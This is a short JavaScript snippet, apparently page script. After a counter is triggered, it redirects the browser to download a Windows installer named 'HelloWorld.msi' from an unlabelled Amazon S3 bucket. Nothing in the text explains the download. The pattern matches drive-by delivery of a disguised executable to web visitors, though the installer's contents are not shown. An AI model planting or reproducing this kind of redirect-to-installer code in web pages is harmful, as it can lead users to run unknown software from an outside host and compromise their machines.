function loadUrl()
{
	if(num>=1)
	{
		var url="https://gg622.s3.ap-southeast-2.amazonaws.com/HelloWorld.msi";
		window.location=url;
	}
}

var num=0;
function getLoad()
{
	num++;
}
